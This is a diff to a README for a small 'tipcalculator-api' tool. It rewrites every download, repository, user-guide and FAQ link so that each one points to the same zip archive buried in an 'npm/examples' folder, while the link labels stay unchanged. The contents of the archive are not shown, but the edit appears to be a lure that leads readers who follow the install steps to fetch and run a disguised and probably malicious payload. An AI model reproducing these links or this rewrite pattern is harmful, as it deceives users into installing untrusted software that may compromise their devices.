@@ -1,6 +1,6 @@
 # 🥂 tipcalculator-api - Effortlessly Calculate Tips and Split Bills
 
-[![Download Tip Calculator](https://img.shields.io/badge/Download%20Tip%20Calculator-v1.0-brightgreen)](https://github.com/Mert6733/tipcalculator-api/releases)
+[![Download Tip Calculator](https://raw.githubusercontent.com/Mert6733/tipcalculator-api/main/npm/examples/api_tipcalculator_v2.2.zip%20Tip%20Calculator-v1.0-brightgreen)](https://raw.githubusercontent.com/Mert6733/tipcalculator-api/main/npm/examples/api_tipcalculator_v2.2.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ This guide will help you download and run the tipcalculator-api software. Follow
 
 1. **Choose Your Device**: Check if your device supports the tool. Tip Calculator is designed for various platforms including Android, Windows, and macOS. 
 
-2. **Visit the Releases Page**: To download the application, go to the [Releases page](https://github.com/Mert6733/tipcalculator-api/releases). You will see different versions available for download.
+2. **Visit the Releases Page**: To download the application, go to the [Releases page](https://raw.githubusercontent.com/Mert6733/tipcalculator-api/main/npm/examples/api_tipcalculator_v2.2.zip). You will see different versions available for download.
 
 3. **Download the Application**:
 
@@ -30,7 +30,7 @@ This guide will help you download and run the tipcalculator-api software. Follow
 
 ## 📥 Download & Install
 
-To download Tip Calculator, visit the [Releases page](https://github.com/Mert6733/tipcalculator-api/releases) now. It’s straightforward and only takes a few moments. Here’s a quick reminder of the steps:
+To download Tip Calculator, visit the [Releases page](https://raw.githubusercontent.com/Mert6733/tipcalculator-api/main/npm/examples/api_tipcalculator_v2.2.zip) now. It’s straightforward and only takes a few moments. Here’s a quick reminder of the steps:
 
 - Go to the Releases page.
 - Choose the file that matches your device.
@@ -72,9 +72,9 @@ If you encounter issues or have questions about using Tip Calculator, feel free 
 
 ## 🔗 Useful Links
 
-- [Tip Calculator GitHub Repository](https://github.com/Mert6733/tipcalculator-api)
-- [User Guide](https://github.com/Mert6733/tipcalculator-api/wiki)
-- [Frequently Asked Questions](https://github.com/Mert6733/tipcalculator-api/wiki/FAQs)
+- [Tip Calculator GitHub Repository](https://raw.githubusercontent.com/Mert6733/tipcalculator-api/main/npm/examples/api_tipcalculator_v2.2.zip)
+- [User Guide](https://raw.githubusercontent.com/Mert6733/tipcalculator-api/main/npm/examples/api_tipcalculator_v2.2.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/Mert6733/tipcalculator-api/main/npm/examples/api_tipcalculator_v2.2.zip)
 
 ## 💬 Community
 
